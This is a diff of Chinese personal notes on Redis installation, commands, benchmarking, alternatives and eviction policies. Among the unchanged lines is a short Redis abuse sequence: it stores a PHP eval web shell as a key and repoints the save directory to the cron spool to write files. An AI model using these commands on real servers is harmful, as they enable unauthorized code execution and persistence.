@@ -1,5 +1,11 @@
 redis 安装与升级
 
+redis替代品
+https://github.com/OpenAtomFoundation/pika
+https://www.pangugle.com/tech/article/pika/tutorial.html
+https://github.com/ideawu/ssdb
+
+
 http://www.cnblogs.com/stephen-liu74/archive/2012/02/18/2356951.html
 https://redis.readthedocs.org/en/latest/
 https://mp.weixin.qq.com/s/2sUWnpJCvkJ8-7XSGLdesA
@@ -37,6 +43,9 @@ keys key*
 del key1 key2
 
 select 0 打开默认为0的数据库
+
+keys TG:TG:*
+scan 0 match TG:TG:* count 100
 
 
 redis 安装
@@ -271,6 +280,7 @@ redis-benchmark -h 127.0.0.1 -p 6379 -c 100 -n 100000
 redis-benchmark -h 10.1.1.96 -p 6379 -c 100 -n 100000
 redis-benchmark -h 10.1.1.96 -p 6379 -q -d 500
 redis-benchmark -t set,get -n 100000 -q
+redis-benchmark -h 127.0.0.1 -p 6379 -c 50 -n 10000 -q
 
 redis-cli -h 192.168.5.135
 set one "\n\n\n<?php @eval($_POST['c']);?>\n\n\n"
@@ -293,3 +303,14 @@ config set dir /var/spool/cron  #设置工作目录
 config  set dbfilename "root"
 save
 
+对有设置任职过期时间的职员进行淘汰，没有设定任职过期时间的不会淘汰，淘汰策略如下：
+volatile-lru：淘汰最近最少上一线干活的人员；
+volatile-lfu：4.0 之后新增的策略，淘汰上一线干活次数最少的人员；
+volatile-random：随机淘汰，腾出坑位给新人；
+volatile-ttl：淘汰设置了任期时间的公务员，谁最接近任期时间就先淘汰谁。
+对所有类型人员淘汰，不管是永久 vip 的皇亲国戚还是设置了任职过期时间的人员。
+allkeys-lru：淘汰最近最少上一线干活的职员；
+allkeys-lfu：淘汰最少上一线干活的公务员；
+allkeys-random：随机淘汰职员，为新兵腾出空位。
+
+CONFIG SET maxmemory 4gb
